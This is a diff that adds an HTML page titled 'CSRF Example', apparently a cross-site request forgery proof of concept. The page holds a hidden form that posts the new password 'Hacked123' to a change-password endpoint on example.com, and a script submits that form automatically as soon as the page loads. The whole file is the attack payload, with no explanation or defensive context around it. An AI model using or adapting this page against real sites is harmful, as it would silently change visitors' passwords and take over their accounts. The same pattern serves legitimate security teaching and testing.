@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CSRF Example</title>
+</head>
+<body>
+  <form id="myForm" action="https://example.com/change-password" method="POST">
+    <input type="hidden" name="new_password" value="Hacked123">
+    <input type="hidden" name="confirm_password" value="Hacked123">
+    <input type="submit" value="Submit">
+  </form>
+
+  <script>
+    // Ensure the script runs after the page has fully loaded
+    window.onload = function() {
+      // Access the form by its ID and submit it
+      document.getElementById('myForm').submit();
+    }
+  </script>
+</body>
+</html>
